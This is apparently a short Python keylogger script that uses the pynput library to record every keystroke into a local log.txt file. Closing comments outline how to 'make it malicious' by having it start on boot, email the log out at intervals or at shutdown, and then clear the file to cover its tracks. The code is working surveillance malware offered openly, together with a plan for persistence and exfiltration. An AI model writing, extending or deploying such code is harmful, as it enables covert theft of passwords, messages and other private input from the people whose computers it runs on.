from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

    with open("log.txt","a") as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()

# To make it malicious 
# It should start on boot up
# It should send the log.txt file after certain interval or at least at every shut down
# Interval should be say 15 min or 30 min
# The longer the interval the larger the file size may be
# After certain interval or after the email is sent it should clear the file
